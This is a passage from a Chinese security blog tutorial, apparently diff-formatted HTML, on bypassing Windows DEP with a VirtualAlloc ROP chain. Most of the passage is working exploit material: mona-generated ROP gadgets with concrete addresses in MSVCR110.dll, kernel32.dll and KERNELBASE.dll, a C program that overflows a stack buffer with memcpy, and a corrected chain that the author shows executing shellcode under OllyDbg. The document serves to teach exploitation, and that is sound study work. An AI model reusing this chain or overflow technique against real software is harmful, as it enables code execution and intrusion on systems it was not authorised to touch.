+<div class="line number59 index58 alt2"><code class="html spaces">      </code><code class="html plain">0x90909090,  // nop</code></div>
+<div class="line number60 index59 alt1"><code class="html spaces">      </code><code class="html plain">0x69390267,  // PUSHAD // RETN [MSVCR110.dll] </code></div>
+<div class="line number61 index60 alt2"><code class="html spaces">    </code><code class="html plain">};</code></div>
+<div class="line number62 index61 alt1"><code class="html spaces">    </code><code class="html plain">if(buf != NULL) {</code></div>
+<div class="line number63 index62 alt2"><code class="html spaces">      </code><code class="html plain">memcpy(buf, rop_gadgets, sizeof(rop_gadgets));</code></div>
+<div class="line number64 index63 alt1"><code class="html spaces">    </code><code class="html plain">};</code></div>
+<div class="line number65 index64 alt2"><code class="html spaces">    </code><code class="html plain">return sizeof(rop_gadgets);</code></div>
+<div class="line number66 index65 alt1"><code class="html spaces">  </code><code class="html plain">}</code></div>
+<div class="line number67 index66 alt2"><code class="html spaces">  </code><code class="html plain">// use the 'rop_chain' variable after this call, it's just an unsigned int[]</code></div>
+<div class="line number68 index67 alt1"><code class="html spaces">  </code><code class="html plain">CREATE_ROP_CHAIN(rop_chain, );</code></div>
+<div class="line number69 index68 alt2"><code class="html spaces">  </code><code class="html plain">// alternatively just allocate a large enough buffer and get the rop chain, i.e.:</code></div>
+<div class="line number70 index69 alt1"><code class="html spaces">  </code><code class="html plain">// unsigned int rop_chain[256];</code></div>
+<div class="line number71 index70 alt2"><code class="html spaces">  </code><code class="html plain">// int rop_chain_length = create_rop_chain(rop_chain, );</code></div>
+</div>
+</td>
+</tr>
+</tbody>
+</table>
+<h3><strong>测试1：</strong></h3>
+<p>填入上述ROP链，接着加上测试的命令：</p>
+<table class="syntaxhighlighter  html" border="0" cellspacing="0" cellpadding="0">
+<tbody>
+<tr>
+<td class="code">
+<div class="container">
+<div class="line number1 index0 alt2"><code class="html plain">PUSH 1;</code></div>
+<div class="line number2 index1 alt1"><code class="html plain">POP ECX;</code></div>
+</div>
+</td>
+</tr>
+</tbody>
+</table>
+<p>对应机器码为0x9059016A</p>
+<p>组合后的POC如下：</p>
+<table class="syntaxhighlighter  html" border="0" cellspacing="0" cellpadding="0">
+<tbody>
+<tr>
+<td class="code">
+<div class="container">
+<div class="line number1 index0 alt2"><code class="html plain">unsigned int shellcode[]=</code></div>
+<div class="line number2 index1 alt1"><code class="html plain">{     </code></div>
+<div class="line number3 index2 alt2"><code class="html spaces">      </code><code class="html plain">0x90909090,0x90909090,0x90909090,0x90909090,</code></div>
+<div class="line number4 index3 alt1"><code class="html spaces">      </code><code class="html plain">0x90909090,0x90909090,0x90909090,0x90909090,</code></div>
+<div class="line number5 index4 alt2"><code class="html spaces">      </code><code class="html plain">0x90909090,0x90909090,0x90909090,0x90909090,</code></div>
+<div class="line number6 index5 alt1"><code class="html spaces">      </code><code class="html plain">0x90909090,</code></div>
+<div class="line number7 index6 alt2"><code class="html spaces">      </code><code class="html plain">0x693a2e92,  // POP ECX // RETN [MSVCR110.dll] </code></div>
+<div class="line number8 index7 alt1"><code class="html spaces">      </code><code class="html plain">0x693bd19c,  // ptr to &amp;VirtualAlloc() [IAT MSVCR110.dll]</code></div>
+<div class="line number9 index8 alt2"><code class="html spaces">      </code><code class="html plain">0x69353486,  // MOV EAX,DWORD PTR DS:[ECX] // RETN [MSVCR110.dll] </code></div>
+<div class="line number10 index9 alt1"><code class="html spaces">      </code><code class="html plain">0x779f9dca,  // XCHG EAX,ESI // RETN [ntdll.dll] </code></div>
+<div class="line number11 index10 alt2"><code class="html spaces">      </code><code class="html plain">0x69370742,  // POP EBP // RETN [MSVCR110.dll] </code></div>
+<div class="line number12 index11 alt1"><code class="html spaces">      </code><code class="html plain">0x75dac58d,  // &amp; call esp [KERNELBASE.dll]</code></div>
+<div class="line number13 index12 alt2"><code class="html spaces">      </code><code class="html plain">0x6932ea52,  // POP EAX // RETN [MSVCR110.dll] </code></div>
+<div class="line number14 index13 alt1"><code class="html spaces">      </code><code class="html plain">0xffffffff,  // Value to negate, will become 0x00000001</code></div>
+<div class="line number15 index14 alt2"><code class="html spaces">      </code><code class="html plain">0x69353746,  // NEG EAX // RETN [MSVCR110.dll] </code></div>
+<div class="line number16 index15 alt1"><code class="html spaces">      </code><code class="html plain">0x75da655d,  // XCHG EAX,EBX // ADD BH,CH // DEC ECX // RETN 0x10 [KERNELBASE.dll] </code></div>
+<div class="line number17 index16 alt2"><code class="html spaces">      </code><code class="html plain">0x77216829,  // POP EAX // RETN [kernel32.dll] </code></div>
+<div class="line number18 index17 alt1"><code class="html spaces">      </code><code class="html plain">0x41414141,  // Filler (RETN offset compensation)</code></div>
+<div class="line number19 index18 alt2"><code class="html spaces">      </code><code class="html plain">0x41414141,  // Filler (RETN offset compensation)</code></div>
+<div class="line number20 index19 alt1"><code class="html spaces">      </code><code class="html plain">0x41414141,  // Filler (RETN offset compensation)</code></div>
+<div class="line number21 index20 alt2"><code class="html spaces">      </code><code class="html plain">0x41414141,  // Filler (RETN offset compensation)</code></div>
+<div class="line number22 index21 alt1"><code class="html spaces">      </code><code class="html plain">0xa2800fc0,  // put delta into eax (-&gt; put 0x00001000 into edx)</code></div>
+<div class="line number23 index22 alt2"><code class="html spaces">      </code><code class="html plain">0x7721502a,  // ADD EAX,5D800040 // RETN 0x04 [kernel32.dll] </code></div>
+<div class="line number24 index23 alt1"><code class="html spaces">      </code><code class="html plain">0x771abd3a,  // XCHG EAX,EDX // RETN [kernel32.dll] </code></div>
+<div class="line number25 index24 alt2"><code class="html spaces">      </code><code class="html plain">0x41414141,  // Filler (RETN offset compensation)</code></div>
+<div class="line number26 index25 alt1"><code class="html spaces">      </code><code class="html plain">0x69329bb1,  // POP EAX // RETN [MSVCR110.dll] </code></div>
+<div class="line number27 index26 alt2"><code class="html spaces">      </code><code class="html plain">0xffffffc0,  // Value to negate, will become 0x00000040</code></div>
+<div class="line number28 index27 alt1"><code class="html spaces">      </code><code class="html plain">0x69354484,  // NEG EAX // RETN [MSVCR110.dll] </code></div>
+<div class="line number29 index28 alt2"><code class="html spaces">      </code><code class="html plain">0x771d0946,  // XCHG EAX,ECX // RETN [kernel32.dll] </code></div>
+<div class="line number30 index29 alt1"><code class="html spaces">      </code><code class="html plain">0x6935e68f,  // POP EDI // RETN [MSVCR110.dll] </code></div>
+<div class="line number31 index30 alt2"><code class="html spaces">      </code><code class="html plain">0x69354486,  // RETN (ROP NOP) [MSVCR110.dll]</code></div>
+<div class="line number32 index31 alt1"><code class="html spaces">      </code><code class="html plain">0x693a7031,  // POP EAX // RETN [MSVCR110.dll] </code></div>
+<div class="line number33 index32 alt2"><code class="html spaces">      </code><code class="html plain">0x90909090,  // nop</code></div>
+<div class="line number34 index33 alt1"><code class="html spaces">      </code><code class="html plain">0x69390267,  // PUSHAD // RETN [MSVCR110.dll] </code></div>
+<div class="line number35 index34 alt2"><code class="html spaces">      </code><code class="html plain">0x9059016A,  //PUSH 1  // POP ECX </code></div>
+<div class="line number36 index35 alt1"><code class="html spaces">      </code><code class="html plain">0x90909090,</code></div>
+<div class="line number37 index36 alt2"><code class="html spaces">      </code><code class="html plain">0x90909090,</code></div>
+<div class="line number38 index37 alt1"><code class="html spaces">      </code><code class="html plain">0x90909090,</code></div>
+<div class="line number39 index38 alt2"><code class="html spaces">      </code><code class="html plain">0x90909090</code></div>
+<div class="line number40 index39 alt1"><code class="html plain">};</code></div>
+<div class="line number41 index40 alt2"><code class="html plain">void test()</code></div>
+<div class="line number42 index41 alt1"><code class="html plain">{</code></div>
+<div class="line number43 index42 alt2"><code class="html spaces">    </code><code class="html plain">char buffer[48];    </code></div>
+<div class="line number44 index43 alt1"><code class="html spaces">    </code><code class="html plain">printf("3n");</code></div>
+<div class="line number45 index44 alt2"><code class="html spaces">    </code><code class="html plain">memcpy(buffer,shellcode,sizeof(shellcode));</code></div>
+<div class="line number46 index45 alt1"><code class="html plain">}</code></div>
+<div class="line number47 index46 alt2"><code class="html plain">int main()</code></div>
+<div class="line number48 index47 alt1"><code class="html plain">{</code></div>
+<div class="line number49 index48 alt2"><code class="html spaces">    </code><code class="html plain">printf("1n");</code></div>
+<div class="line number50 index49 alt1"><code class="html spaces">    </code><code class="html plain">test();</code></div>
+<div class="line number51 index50 alt2"><code class="html spaces">    </code><code class="html plain">char Buf[] = </code></div>
+<div class="line number52 index51 alt1"><code class="html spaces">        </code><code class="html plain">"x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90"</code></div>
+<div class="line number53 index52 alt2"><code class="html spaces">        </code><code class="html plain">"x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90"</code></div>
+<div class="line number54 index53 alt1"><code class="html spaces">        </code><code class="html plain">"x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90"</code></div>
+<div class="line number55 index54 alt2"><code class="html spaces">        </code><code class="html plain">"x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90"</code></div>
+<div class="line number56 index55 alt1"><code class="html spaces">        </code><code class="html plain">"x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90"</code></div>
+<div class="line number57 index56 alt2"><code class="html spaces">        </code><code class="html plain">"x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90"</code></div>
+<div class="line number58 index57 alt1"><code class="html spaces">        </code><code class="html plain">"x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90";</code></div>
+<div class="line number59 index58 alt2"><code class="html spaces">    </code><code class="html plain">return 0;</code></div>
+<div class="line number60 index59 alt1"><code class="html plain">}</code></div>
+</div>
+</td>
+</tr>
+</tbody>
+</table>
+<p>使用<a href="https://www.secpulse.com/archives/tag/OllyDbg" target="_blank">OllyDbg</a>打开，单步跟踪到VirtualAllocEx()函数入口点</p>
+<p><a href="http://www.secpulse.com/wp-content/uploads/2017/04/111.png"><img class="alignnone size-full wp-image-57376" src="http://www.secpulse.com/wp-content/uploads/2017/04/111.png" alt="1" width="1258" height="720" /></a></p>
+<p>&nbsp;</p>
+<p>如图，查看传入的函数参数</p>
+<table class="syntaxhighlighter  html" border="0" cellspacing="0" cellpadding="0">
+<tbody>
+<tr>
+<td class="code">
+<div class="container">
+<div class="line number1 index0 alt2"><code class="html plain">申请内存区域的起始地址为0x0012FF38 </code></div>
+<div class="line number2 index1 alt1"><code class="html plain">申请内存区域的大小为0x0000D101,换算成十进制为53505 </code></div>
+<div class="line number3 index2 alt2"><code class="html plain">申请内存的类型为0x00001000 </code></div>
+<div class="line number4 index3 alt1"><code class="html plain">申请内存的访问控制类型为0x00000040，即PAGE_EXECUTE_READWRITE</code></div>
+</div>
+</td>
+</tr>
+</tbody>
+</table>
+<p>按F8单步跟踪，如图</p>
+<p><a href="http://www.secpulse.com/wp-content/uploads/2017/04/23.png"><img class="alignnone size-full wp-image-57377" src="http://www.secpulse.com/wp-content/uploads/2017/04/23.png" alt="2" width="1260" height="675" /></a></p>
+<p>&nbsp;</p>
+<p>返回值EAX为0,表示生成失败</p>
+<p>查找原因，根据之前的经验，猜测是申请内存区域过长导致</p>
+<h3><strong>测试2：</strong></h3>
+<p>尝试修改内存大小</p>
+<p>申请内存区域的起始地址为0x0012FF38，距离当前内存页结束还有200字节(0x00130000-0x0012FF38)</p>
+<p>猜测修改的内存长度小于等于200才能满足条件</p>
+<p><a href="http://www.secpulse.com/wp-content/uploads/2017/04/32.png"><img class="alignnone size-full wp-image-57378" src="http://www.secpulse.com/wp-content/uploads/2017/04/32.png" alt="3" width="1258" height="614" /></a></p>
+<p>&nbsp;</p>
+<p>如上图，将内存长度设置为200(0x000000C8)</p>
+<p>按F8单步跟踪，如下图</p>
+<p><a href="http://www.secpulse.com/wp-content/uploads/2017/04/42.png"><img class="alignnone size-full wp-image-57379" src="http://www.secpulse.com/wp-content/uploads/2017/04/42.png" alt="4" width="1257" height="705" /></a></p>
+<p>&nbsp;</p>
+<p>申请成功，函数返回申请内存的起始地址</p>
+<p>特别注意的是此处为当前内存页的起始地址：0x0012F000（而不是传入的内存起始地址0x0012FF38）</p>
+<p><strong>测试3：</strong></p>
+<p>再次测试，将长度设置为201，分配内存失败</p>
+<p>根据以上测试结果，猜测：VirtualAllocEx()函数无法跨内存页申请内存</p>
+<p><strong>测试4：</strong></p>
+<p>继续测试， 将长度设置为1，函数返回当前内存页的起始地址：0x0012F000，并且shellcode成功执行</p>
+<p>说明传入的函数长度对分配内存没有影响，但是加上申请内存的起始地址后必须小于当前内存页的长度</p>
+<p>也就是说，在溢出过程中，通过<a href="https://www.secpulse.com/archives/tag/VirtualAllocEx()函数申请的内存大小为固定值" target="_blank">VirtualAllocEx()函数申请的内存大小为固定值</a></p>
+<p>现在，我们通过手动修改栈地址实现了DEP的绕过，下面将寻找合适的替换指令，构建自己的ROP链，解决mona自动生成产生的BUG</p>
+<p>PUSHAD表示将所有寄存器的值入栈，入栈顺序为EAX,ECX,EDX,EBX,ESP,EBP,ESI,EDI</p>
+<p>跟踪到PUSHAD，如图</p>
+<p><a href="http://www.secpulse.com/wp-content/uploads/2017/04/52.png"><img class="alignnone size-full wp-image-57380" src="http://www.secpulse.com/wp-content/uploads/2017/04/52.png" alt="5" width="1253" height="646" /></a></p>
+<p>&nbsp;</p>
+<p>EBX存储内存的长度，需要将EBX修改为小于201的值</p>
+<h2><strong>0x04 查找替代指令，构造ROP链</strong></h2>
+<p>在rop.txt中寻找合适的替代指令</p>
+<p><a href="http://www.secpulse.com/wp-content/uploads/2017/04/62.png"><img class="alignnone size-full wp-image-57381" src="http://www.secpulse.com/wp-content/uploads/2017/04/62.png" alt="6" width="1209" height="624" /></a></p>
+<p>&nbsp;</p>
+<p>如上图，搜索关键词EBX,找到一条合适的替代指令：</p>
+<table class="syntaxhighlighter  html" border="0" cellspacing="0" cellpadding="0">
+<tbody>
+<tr>
+<td class="code">
+<div class="container">
+<div class="line number1 index0 alt2"><code class="html plain">0x771c80a2 : # XOR EAX,EAX # POP EBX # RETN ** [kernel32.dll] ** | {PAGE_EXECUTE_READ}</code></div>
+</div>
+</td>
+</tr>
+</tbody>
+</table>
+<p>XOR EAX,EAX 会将寄存器EAX的值清零</p>
+<p>POP EBX 会从栈顶取值并赋值给EBX</p>
+<p>选择合适的位置，并为EBX赋值,需要注意：</p>
+<p>该指令将寄存器EAX的值清零，所以需要找到与EAX寄存器值无关的位置</p>
+<p>POP EBX会读取下一条指令的内容，并赋值给EBX，所以后面接上EBX的值就好，例如0x00000028, // Set EBX=0x00000028(40)</p>
+<p>找到一个合适的位置，放在0x693a7031, // POP EAX // RETN [MSVCR110.dll] 前面</p>
+<p>完整shellcode如下：</p>
+<table class="syntaxhighlighter  html" border="0" cellspacing="0" cellpadding="0">
+<tbody>
+<tr>
+<td class="code">
+<div class="container">
+<div class="line number1 index0 alt2"><code class="html plain">unsigned int shellcode[]=</code></div>
+<div class="line number2 index1 alt1"><code class="html plain">{     </code></div>
+<div class="line number3 index2 alt2"><code class="html spaces">      </code><code class="html plain">0x90909090,0x90909090,0x90909090,0x90909090,</code></div>
+<div class="line number4 index3 alt1"><code class="html spaces">      </code><code class="html plain">0x90909090,0x90909090,0x90909090,0x90909090,</code></div>
+<div class="line number5 index4 alt2"><code class="html spaces">      </code><code class="html plain">0x90909090,0x90909090,0x90909090,0x90909090,</code></div>
+<div class="line number6 index5 alt1"><code class="html spaces">      </code><code class="html plain">0x90909090,</code></div>
+<div class="line number7 index6 alt2"><code class="html spaces">      </code><code class="html plain">0x693a2e92,  // POP ECX // RETN [MSVCR110.dll] </code></div>
+<div class="line number8 index7 alt1"><code class="html spaces">      </code><code class="html plain">0x693bd19c,  // ptr to &amp;VirtualAlloc() [IAT MSVCR110.dll]</code></div>
+<div class="line number9 index8 alt2"><code class="html spaces">      </code><code class="html plain">0x69353486,  // MOV EAX,DWORD PTR DS:[ECX] // RETN [MSVCR110.dll] </code></div>
+<div class="line number10 index9 alt1"><code class="html spaces">      </code><code class="html plain">0x779f9dca,  // XCHG EAX,ESI // RETN [ntdll.dll] </code></div>
+<div class="line number11 index10 alt2"><code class="html spaces">      </code><code class="html plain">0x69370742,  // POP EBP // RETN [MSVCR110.dll] </code></div>
+<div class="line number12 index11 alt1"><code class="html spaces">      </code><code class="html plain">0x75dac58d,  // &amp; call esp [KERNELBASE.dll]</code></div>
+<div class="line number13 index12 alt2"><code class="html spaces">      </code><code class="html plain">0x6932ea52,  // POP EAX // RETN [MSVCR110.dll] </code></div>
+<div class="line number14 index13 alt1"><code class="html spaces">      </code><code class="html plain">0xffffffff,  // Value to negate, will become 0x00000001</code></div>
+<div class="line number15 index14 alt2"><code class="html spaces">      </code><code class="html plain">0x69353746,  // NEG EAX // RETN [MSVCR110.dll] </code></div>
+<div class="line number16 index15 alt1"><code class="html spaces">      </code><code class="html plain">0x75da655d,  // XCHG EAX,EBX // ADD BH,CH // DEC ECX // RETN 0x10 [KERNELBASE.dll] </code></div>
+<div class="line number17 index16 alt2"><code class="html spaces">      </code><code class="html plain">0x77216829,  // POP EAX // RETN [kernel32.dll] </code></div>
+<div class="line number18 index17 alt1"><code class="html spaces">      </code><code class="html plain">0x41414141,  // Filler (RETN offset compensation)</code></div>
+<div class="line number19 index18 alt2"><code class="html spaces">      </code><code class="html plain">0x41414141,  // Filler (RETN offset compensation)</code></div>
+<div class="line number20 index19 alt1"><code class="html spaces">      </code><code class="html plain">0x41414141,  // Filler (RETN offset compensation)</code></div>
+<div class="line number21 index20 alt2"><code class="html spaces">      </code><code class="html plain">0x41414141,  // Filler (RETN offset compensation)</code></div>
+<div class="line number22 index21 alt1"><code class="html spaces">      </code><code class="html plain">0xa2800fc0,  // put delta into eax (-&gt; put 0x00001000 into edx)</code></div>
+<div class="line number23 index22 alt2"><code class="html spaces">      </code><code class="html plain">0x7721502a,  // ADD EAX,5D800040 // RETN 0x04 [kernel32.dll] </code></div>
+<div class="line number24 index23 alt1"><code class="html spaces">      </code><code class="html plain">0x771abd3a,  // XCHG EAX,EDX // RETN [kernel32.dll] </code></div>
+<div class="line number25 index24 alt2"><code class="html spaces">      </code><code class="html plain">0x41414141,  // Filler (RETN offset compensation)</code></div>
+<div class="line number26 index25 alt1"><code class="html spaces">      </code><code class="html plain">0x69329bb1,  // POP EAX // RETN [MSVCR110.dll] </code></div>
+<div class="line number27 index26 alt2"><code class="html spaces">      </code><code class="html plain">0xffffffc0,  // Value to negate, will become 0x00000040</code></div>
+<div class="line number28 index27 alt1"><code class="html spaces">      </code><code class="html plain">0x69354484,  // NEG EAX // RETN [MSVCR110.dll] </code></div>
+<div class="line number29 index28 alt2"><code class="html spaces">      </code><code class="html plain">0x771d0946,  // XCHG EAX,ECX // RETN [kernel32.dll] </code></div>
+<div class="line number30 index29 alt1"><code class="html spaces">      </code><code class="html plain">0x6935e68f,  // POP EDI // RETN [MSVCR110.dll] </code></div>
+<div class="line number31 index30 alt2"><code class="html spaces">      </code><code class="html plain">0x69354486,  // RETN (ROP NOP) [MSVCR110.dll]</code></div>
+<div class="line number32 index31 alt1"><code class="html spaces">      </code><code class="html plain">0x771c80a2, // # XOR EAX,EAX # POP EBX # RETN   [kernel32.dll]   |   {PAGE_EXECUTE_READ}</code></div>
+<div class="line number33 index32 alt2"><code class="html spaces">      </code><code class="html plain">0x00000028, // Set EBX=0x00000028(40)</code></div>
+<div class="line number34 index33 alt1"><code class="html spaces">      </code><code class="html plain">0x693a7031,  // POP EAX // RETN [MSVCR110.dll] </code></div>
+<div class="line number35 index34 alt2"><code class="html spaces">      </code><code class="html plain">0x90909090,  // nop</code></div>
+<div class="line number36 index35 alt1"><code class="html spaces">      </code><code class="html plain">0x69390267,  // PUSHAD // RETN [MSVCR110.dll] </code></div>
+<div class="line number37 index36 alt2"><code class="html spaces">      </code><code class="html plain">0x9059016A,  //PUSH 1  // POP ECX </code></div>
+<div class="line number38 index37 alt1"><code class="html spaces">      </code><code class="html plain">0x90909090,</code></div>
+<div class="line number39 index38 alt2"><code class="html spaces">      </code><code class="html plain">0x90909090,</code></div>
+<div class="line number40 index39 alt1"><code class="html spaces">      </code><code class="html plain">0x90909090,</code></div>
+<div class="line number41 index40 alt2"><code class="html spaces">      </code><code class="html plain">0x90909090</code></div>
+<div class="line number42 index41 alt1"><code class="html plain">};</code></div>
+</div>
+</td>
+</tr>
+</tbody>
+</table>
+<p>重新编译，使用OllyDbg打开，单步跟踪到VirtualAllocEx()函数入口点</p>
+<p><a href="http://www.secpulse.com/wp-content/uploads/2017/04/71.png"><img class="alignnone size-full wp-image-57382" src="http://www.secpulse.com/wp-content/uploads/2017/04/71.png" alt="7" width="1255" height="655" /></a></p>
+<p>&nbsp;</p>
+<p>如图，查看传入的函数参数</p>
+<p>内存长度被修改为0x00000028(40)，其他传入参数正常</p>
+<p>继续运行，进入CALL ESP，shellcode成功执行</p>
+<h2><strong>0x05 小结</strong></h2>
+<p>利用VirtualAlloc绕过DEP同利用VirtualProtect绕过DEP一样，都需要注意内存页长度的限制，无法跨页修改或者申请内存，这就对shellcode的长度提出了要求</p>
+<p>当然，<a href="https://www.secpulse.com/archives/tag/正常调用API实现VirtualProtect和VirtualAlloc不会存在跨内存页失败的问题" target="_blank">正常调用API实现VirtualProtect和VirtualAlloc不会存在跨内存页失败的问题</a></p>
+<p>mona自动生成的rop链可作为参考模板，结合rop.txt下的替代指令，可构造更合适的ROP链</p>
+<p>&nbsp;</p>
+<blockquote><p>本文为 3gstudent 原创稿件，授权嘶吼独家发布，嘶吼入驻安全脉搏专栏发布，未经许可禁止转载；如若转载，请联系嘶吼编辑： <a href="http://www.4hou.com/technology/4093.html">http://www.4hou.com/technology/4093.html</a></p></blockquote>
+		<div class="pageShenming">
+【安全脉搏：分享技术、悦享品质。文章仅代表作者看法，如有不同观点，欢迎添加安全脉搏微信号：SecPulse，进行交流。】</div>
+<div class="post-tags"><span>Tags: </span><a href="https://www.secpulse.com/archives/tag/immunity-debugger" rel="tag">Immunity Debugger</a><a href="https://www.secpulse.com/archives/tag/ollydbg" rel="tag">OLLYDBG</a><a href="https://www.secpulse.com/archives/tag/virtualallocex%e5%87%bd%e6%95%b0%e7%94%b3%e8%af%b7%e7%9a%84%e5%86%85%e5%ad%98%e5%a4%a7%e5%b0%8f%e4%b8%ba%e5%9b%ba%e5%ae%9a%e5%80%bc" rel="tag">VirtualAllocEx()函数申请的内存大小为固定值</a><a href="https://www.secpulse.com/archives/tag/virtualalloc%e7%bb%95%e8%bf%87dep" rel="tag">VirtualAlloc绕过DEP</a><a href="https://www.secpulse.com/archives/tag/windows-shellcode%e5%ad%a6%e4%b9%a0%e7%ac%94%e8%ae%b0" rel="tag">Windows Shellcode学习笔记</a><a href="https://www.secpulse.com/archives/tag/%e5%88%a9%e7%94%a8virtualalloc%e7%bb%95%e8%bf%87dep" rel="tag">利用VirtualAlloc绕过DEP</a><a href="https://www.secpulse.com/archives/tag/%e6%9e%84%e9%80%a0rop%e9%93%be" rel="tag">构造ROP链</a><a href="https://www.secpulse.com/archives/tag/%e6%ad%a3%e5%b8%b8%e8%b0%83%e7%94%a8api%e5%ae%9e%e7%8e%b0virtualprotect%e5%92%8cvirtualalloc%e4%b8%8d%e4%bc%9a%e5%ad%98%e5%9c%a8%e8%b7%a8%e5%86%85%e5%ad%98%e9%a1%b5%e5%a4%b1%e8%b4%a5%e7%9a%84%e9%97%ae" rel="tag">正常调用API实现VirtualProtect和VirtualAlloc不会存在跨内存页失败的问题</a></div>
+		</div>
+	<!-- .single-content -->
+		<div class="pageActive">
+	<div class="mark-like-btn">
+							</div>
+	<!-- Baidu Button BEGIN -->
+	<div class="bdshare">
+		<div class="bdsharebuttonbox">
+			<a href="#" class="bds_more" data-cmd="more"></a><a href="#"
+				class="bds_qzone" data-cmd="qzone" title="分享到QQ空间"></a><a href="#"
+				class="bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a><a href="#"
+				class="bds_weixin" data-cmd="weixin" title="分享到微信"></a>
+		</div>
+		<script>
+		window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"32"},"share":{}};
+		with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+		</script>
+
+	</div>
+</div>    <section id="text-6" class="widget-container widget_text hidden-xs">			<div class="textwidget"><center><a href="https://www.duoyinsu.com" target="_blank" title="安识科技 专业安全服务商"><img src="https://www.secpulse.com/wp-includes/images/secweixin.png" style="width:785px;height:315px"></a><center></div>
+		</section><section id="related_post-2" class="widget-container widget_related_post hidden-xs"><h3 class="widget-title">相关文章</h3>
+
+	<ul class="related_post">
+				<li><a href="https://www.secpulse.com/archives/56676.html" title="详细阅读 windows下基于栈的缓存区溢出攻击">
+		 <img src="https://www.secpulse.com/wp-content/themes/sec/timthumb.php?src=http://www.secpulse.com/wp-content/uploads/2017/03/exploit11.png&h=150&w=249&zc=1" alt="windows下基于栈的缓存区溢出攻击" class="xg-img"/>
+		<p>windows下基于栈的缓存区溢出攻击</P></a></li>
+				<li><a href="https://www.secpulse.com/archives/55632.html" title="详细阅读 京东信息安全部2017招聘各类人才">
+		 <img src="https://www.secpulse.com/wp-content/themes/sec/timthumb.php?src=https://www.secpulse.com/wp-content/uploads/2017/02/jd.png&h=150&w=249&zc=1" alt="京东信息安全部2017招聘各类人才" class="xg-img"/>
+		<p>京东信息安全部2017招聘各类人才</P></a></li>
+				<li><a href="https://www.secpulse.com/archives/51027.html" title="详细阅读 初探Windows Fuzzing神器&#8212;-Winafl">
+		 <img src="https://www.secpulse.com/wp-content/themes/sec/timthumb.php?src=https://www.secpulse.com/wp-content/uploads/2016/08/hack_samll.jpg&h=150&w=249&zc=1" alt="初探Windows Fuzzing神器&#8212;-Winafl" class="xg-img"/>
+		<p>初探Windows Fuzzing神器&&hellip;</P></a></li>
+			</ul>
+
+
+</section></article>
+
+
+<!-- 引用 -->
+<div id="comments" class="comments-area">
+	<h2 class="comments-title">
+		抢沙发
+	</h2>
+			<div id="respond" class="comment-respond row">
+		
+
+
+			<form action="https://www.secpulse.com/wp-comments-post.php" method="post" id="commentform">
+		
+				
+						
+			<div id="comboxinfo">
+					<div class="cominfodiv cominfodiv-author ">
+					<p for="author" class="nicheng">
+     <input type="text" name="author" id="author" class="texty" value="" tabindex="1" /> <span class="required">昵称*</span>
+      </p>
+</div>
+					<div class="cominfodiv cominfodiv-email">
+					<p for="email">	<input type="text" name="email" id="email" class="texty" value="" tabindex="2" /> <span class="required">邮箱*</span>
+						</p>
+					</div>
+					<div class="cominfodiv cominfodiv-url">
+					 	<p for="url"><input type="text" name="url" id="url" class="texty" value="" tabindex="3" /><span>网址 </span>
+						</p>
+					</div>
+					
+			
+				
+</div>		       <div class=" cominfodiv-nr">  
+<textarea class="texty" name="w" id="comment" rows="10" tabindex="4" placeholder="输入评论内容..."></textarea><textarea name="comment" cols="100%" rows="4" style="display:none"></textarea>
+							<div class="submitcom">
+							
+					<input id="submit" name="submit" type="submit" tabindex="5" value="提&nbsp;交"/>
+					<input type='hidden' name='comment_post_ID' value='57373' id='comment_post_ID' />
+<input type='hidden' name='comment_parent' id='comment_parent' value='0' />
+<p style="display: none;"><input type="hidden" id="akismet_comment_nonce" name="akismet_comment_nonce" value="0081f1475c" /></p><p style="display: none;"><input type="hidden" id="ak_js" name="ak_js" value="88"/></p>				</div>
+				<div id="cancel_comment_reply"><a rel="nofollow" id="cancel-comment-reply-link" href="/archives/57373.html#respond" style="display:none;">取消回复</a></div>
+			
+</div>
+			
+				
+			</form>
+			
+			
+			<script type="text/javascript">
+				document.getElementById("comment").onkeydown = function (moz_ev){
+				var ev = null;
+				if (window.event){
+				ev = window.event;
+				}else{
+				ev = moz_ev;
+				}
+				if (ev != null && ev.ctrlKey && ev.keyCode == 13){
+				document.getElementById("submit").click();}
+				}
+			</script></div>
+	 		
+</div>
+<!-- #comments --></div>
+		
+<div class="xs-right sidebar xs-hidden xss-hidden">
+	<div class="authorbox">
+	<div class="author-top">
+<div id="author-img">
+<img src="https://www.secpulse.com/wp-content/uploads/2017/01/RoarTalk2.png" width="79" height="50" alt="嘶吼RoarTalk" class="avatar avatar-96 wp-user-avatar wp-user-avatar-96 alignnone photo" />
+</div>
+<div class="au-name">
+<a href="https://www.secpulse.com/archives/author/roartalk" title="由嘶吼RoarTalk发布" rel="author">嘶吼RoarTalk</a><br>
+ <span class="au-title">总共17篇文章</span>
+</div> </div>
+	<div class="author-word"><span class="quotes q1"></span>
+回归最本质的信息安全,互联网安全新媒体	<span class="quotes q2"></span></div>
+	</div>
+	
+				<aside id="recent-posts-2" class="widget-container widget_recent_entries">		<div class="si-title"><h2>最新脉搏</h2></div>		<ul>
+					<li>
+				<a href="https://www.secpulse.com/archives/60653.html">《安天365安全研究》第5期</a>
+						</li>
+					<li>
+				<a href="https://www.secpulse.com/archives/60630.html">供应链攻击：CCleaner 5.33官方下载被植入恶意代码（附技术详解）</a>
+						</li>
+					<li>
+				<a href="https://www.secpulse.com/archives/60605.html">2017先知创新大会：有ZHI而来</a>
+						</li>
+					<li>
+				<a href="https://www.secpulse.com/archives/60576.html">甲方工作杂谈</a>
+						</li>
+					<li>
+				<a href="https://www.secpulse.com/archives/60394.html">Catfish—缓存漏洞&#038;&#038;配合CSRF到Getshell</a>
+						</li>
+				</ul>
+		</aside><aside id="hot_comment-3" class="widget-container widget_hot_comment"><div class="si-title"><h2>脉搏热评</h2></div>
+	<ul class="hot_comment_widget">
+		
+<li><i class="fa fa-angle-right fa-1"></i><a href= "https://www.secpulse.com/archives/59497.html" rel="bookmark" title="XSS挑战之旅学习总结 (7条评论)" >XSS挑战之旅学习总结</a></li>
